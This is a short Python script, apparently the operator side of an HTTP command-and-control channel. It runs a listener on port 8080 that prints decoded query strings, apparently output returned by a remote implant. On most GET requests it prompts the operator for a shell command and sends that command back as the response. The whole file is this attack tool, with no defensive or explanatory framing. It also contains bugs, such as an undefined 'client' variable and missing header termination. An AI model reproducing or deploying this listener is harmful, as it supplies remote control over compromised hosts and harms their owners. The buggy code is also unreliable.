import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse 
from urllib.parse import unquote
import time

hostName = ""
hostPort = 8080

class MyServer(BaseHTTPRequestHandler):

    def do_GET(self):
                
        parse=urlparse(self.path).query
        decoded=unquote(unquote(parse))
        decoded=unquote(unquote(parse))
        print(decoded)
        #decoded=urllib.unquote(parse).decode('utf8')
        #print (decoded)
        #print ("path is "+self.path)
        if not "data" in self.path:
            command = input("#")
            type(command)
            self.send_response(200)
            self.wfile.write(bytes(command , "utf-8"))
    def do_POST(self):
        print( "incomming http: ", self.path )
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        self.send_response(200)
        client.close()
    def log_message(self, format, *args): 
        return

myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
	myServer.serve_forever()
except KeyboardInterrupt:
	pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
